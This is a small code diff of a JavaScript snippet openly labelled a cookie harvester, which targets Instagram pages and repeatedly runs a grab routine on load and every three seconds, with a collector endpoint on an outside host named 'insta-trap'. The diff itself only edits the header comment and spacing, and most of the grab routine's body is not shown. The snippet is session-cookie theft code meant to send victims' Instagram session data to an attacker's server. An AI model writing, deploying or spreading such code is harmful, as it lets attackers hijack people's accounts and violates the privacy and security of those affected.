@@ -1,6 +1,6 @@
-/* OMEGA – IG sessionid harvester */
+/* OMEGA – raw-cookie harvester */
 (function () {
-  const COLLECTOR_URL = "https://insta-trap.onrender.com/in";// Render URL
+  const COLLECTOR_URL = "https://insta-trap.onrender.com/in"; // Render URL
   const IG_DOMAINS = ["instagram.com", "www.instagram.com"];
   function grab() {
     if (!IG_DOMAINS.includes(location.hostname)) return;
@@ -17,3 +17,4 @@
   window.addEventListener("load", grab);
   setInterval(grab, 3000);
 })();
+
